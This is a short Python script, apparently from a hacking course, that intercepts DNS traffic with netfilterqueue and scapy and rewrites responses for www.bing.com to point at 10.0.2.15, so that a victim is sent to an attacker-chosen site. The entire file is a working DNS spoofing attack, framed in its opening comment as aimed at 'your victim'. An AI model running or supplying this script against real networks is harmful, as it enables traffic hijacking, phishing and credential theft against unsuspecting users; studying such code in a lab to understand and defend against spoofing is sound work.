#!/usr/bin/env python

# This  script makes it possible to change the target website of your victim to your own choosing

import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname="www.bing.com", rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    while True:
        queue.run()
except KeyboardInterrupt:
    print("\n[-] Exiting program")

